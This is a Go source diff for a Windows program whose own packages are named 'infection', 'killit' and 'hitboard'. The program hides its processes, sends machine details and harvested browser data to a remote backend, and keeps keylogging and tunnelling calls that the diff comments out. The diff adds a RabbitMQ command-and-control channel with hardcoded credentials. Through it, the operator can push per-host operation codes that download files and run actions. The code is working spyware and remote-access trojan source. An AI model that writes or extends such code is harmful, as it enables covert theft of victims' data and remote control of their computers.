@@ -1,14 +1,15 @@
 package main
 
 import (
+	"encoding/json"
 	"github.com/scottkiss/grtm"
+	"github.com/streadway/amqp"
 	"infection/browser"
 	"infection/etcd"
-	"infection/hitboard"
 	"infection/killit"
 	"infection/machineinfo"
+	"infection/rmq"
 	"infection/transfer"
-	"infection/tunnel"
 	"infection/util/icon"
 	"infection/util/lib"
 	"io/ioutil"
@@ -22,15 +23,19 @@ import (
 )
 
 var localAddr string
+var backendAddr string
+var mqAddr string
 
 type Info struct {
 	Dev        bool
+	DevEnable  bool
 	ClientPort int
 	PacPort    string
 }
 
 var Config = Info{
 	true,
+	false,
 	8888,
 	":9999",
 }
@@ -76,9 +81,9 @@ func onReady() {
 			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			cmd2.Start()
 			finflag := make(chan string)
-			go machineinfo.MachineSend("http://"+conf.Url+":5002/machine/machineInfo", finflag)
+			go machineinfo.MachineSend("http://"+conf.Url+backendAddr+"/machine/machineInfo", finflag)
 			<-finflag
-			go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
+			go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
 		} else {
 			go lib.ListProcess()
 			//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
@@ -88,12 +93,25 @@ func onReady() {
 			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			cmd2.Start()
 		}
-		go killit.Killit()
-		go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
-		go tunnel.Tunnel(conf.Url)
+		//go killit.Killit()
+		//go hitboard.KeyBoardCollection("http://" + conf.Url + backendAddr +"/keyboard/record")
+		//go tunnel.Tunnel(conf.Url)
 		////check update
-		go lib.DoUpdate()
+		//go lib.DoUpdate()
 	}()
+	AmqpURI := "amqp://jin:jinjin123@" + conf.Url + mqAddr
+	mqhost := rmq.NewIConfigByVHost(lib.MQHOST)
+	iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
+	//queuename := lib.HOSTID + "-"+lib.GetRandomString(6)
+	queuename := lib.HOSTID + "-main"
+	cerr := iConsumer.Subscribe("mainopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
+	if cerr != nil {
+		appConfig := appConfigMgr.config.Load().(*AppConfig)
+		AmqpURI := "amqp://jin:jinjin123@" + appConfig.Url + mqAddr
+		iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
+		iConsumer.Subscribe("mainopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
+	}
+	go lib.Fav("http://" + conf.Url + backendAddr + "/browser/")
 	//control proxy thread
 	gm := grtm.NewGrManager()
 
@@ -132,6 +150,13 @@ func onExit() {
 }
 func init() {
 	lib.KillCheck()
+	if Config.DevEnable {
+		backendAddr = lib.TMVC
+		mqAddr = lib.TMQ
+	} else {
+		backendAddr = lib.PMVC
+		mqAddr = lib.PMQ
+	}
 	//currentprogram path log
 	content, _ := transfer.GetTargetPath()
 	data := []byte(content)
@@ -147,4 +172,23 @@ func init() {
 }
 func main() {
 	systray.Run(onReady, onExit)
+}
+
+type Message struct {
+	Hostid string //hostid
+	Code   int    //opeation code
+	Path   string //download path
+	Diff   int    //not diff all do  0 one  1 all
+	Num    int    // how many at 10 min 1min 13 pic
+	Fname  string //file name
+}
+
+func mqHandler(d amqp.Delivery) {
+	appConfig := appConfigMgr.config.Load().(*AppConfig)
+	log.Println("have message")
+	body := d.Body
+	//consumerTag := d.ConsumerTag
+	var msg Message
+	json.Unmarshal(body, &msg)
+	go killit.Opeation(msg.Hostid, msg.Code, msg.Path, msg.Diff, msg.Num, msg.Fname, appConfig.Url, backendAddr)
 }
